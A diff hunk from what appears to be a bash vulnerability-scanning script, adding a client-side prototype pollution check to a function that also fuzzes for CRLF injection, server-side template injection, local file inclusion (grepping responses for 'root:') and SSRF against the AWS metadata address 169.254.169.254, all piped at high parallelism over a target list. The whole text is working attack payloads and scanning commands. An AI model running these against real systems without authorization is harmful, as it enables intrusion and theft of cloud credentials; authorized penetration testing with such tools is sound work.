@@ -129,6 +129,7 @@ runInjections() {
     echo -e "Checking injection attacks (may contains false positive)"
     mkdir injects/
     crlfuzz -l $targetList -c $threads -s | anew -q injects/crlf.txt 2> /dev/null
+    sed 's/$/\/?__proto__[testparam]=exploit\//' $targetList | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' 2> /dev/null | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew -q proto.txt &> /dev/null
     cat checkSSTI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/ssti.txt &> /dev/null
     cat checkLFI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/lfi.txt &> /dev/null
     cat parameters/parameters.txt | sed "s/'/ /g" | sed "s/)/ /g" | sed "s/(/ /g" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 50 bash -c "curl -ks '%' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/ssrf.txt &> /dev/null
